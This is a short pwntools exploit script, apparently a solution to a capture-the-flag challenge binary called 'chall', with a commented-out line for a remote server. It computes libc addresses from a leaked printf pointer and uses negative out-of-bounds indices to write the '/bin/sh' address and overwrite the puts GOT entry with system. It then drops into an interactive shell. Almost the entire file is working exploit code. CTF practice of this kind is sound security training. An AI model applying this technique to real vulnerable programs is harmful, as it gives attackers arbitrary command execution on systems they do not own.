from pwn import *

elf_ = ELF("./chall")
context.binary = elf_
p = process(elf_.path)
#p = gdb.debug(elf_.path, gdbscript="b *main+54")
#p = remote(host="35.228.220.66", port=1400)


output = p.recv().split(b"\n")[1]
printf_addr = int(output, 16)
print(hex(printf_addr))

libc_base = printf_addr - 0x606f0
system = libc_base + 0x50d70
bin_sh = libc_base + 0x1d8678

#members_to_ret_main = 0x2aaaaaaa5be8
members_to_puts_got = 0x80 # Members is bigger ==> neg index
members_to_msg = 0x48 # same thing
#first write : msg
#second write : puts

first_index = - (members_to_msg // 8)
p.sendline(str(first_index))
p.recv()
p.sendline(str(bin_sh))

p.recv()

second_index = - (members_to_puts_got // 8)
p.sendline(str(second_index))
p.recv()
p.sendline(str(system))

p.interactive()
